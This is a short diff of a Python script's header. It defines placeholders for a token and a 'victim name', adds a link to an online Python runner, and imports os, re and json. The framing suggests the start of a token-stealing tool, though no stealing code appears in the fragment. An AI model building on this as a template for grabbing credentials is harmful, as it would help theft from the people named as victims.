@@ -1,6 +1,8 @@
 Token = '\n ``PASTE TOKEN HERE``'
 Victim = '\n Victim Name: \n ``PASTE VICTIM NAME HERE``'
 
+# https://trinket.io/embed/python3
+
 import os
 import re
 import json
